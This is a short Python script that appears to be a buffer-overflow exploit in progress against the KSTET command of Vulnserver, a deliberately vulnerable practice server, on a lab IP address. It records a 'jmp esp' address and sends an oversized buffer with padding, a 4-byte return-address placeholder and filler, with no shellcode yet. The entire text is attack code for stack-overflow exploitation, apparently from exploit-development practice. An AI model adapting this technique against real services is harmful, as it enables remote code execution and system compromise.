#jmp esp 625011C7 

import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "KSTET /.:/ " + "A"*70 + "B"*4 + "X"*900
s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(buffer)
s.close()
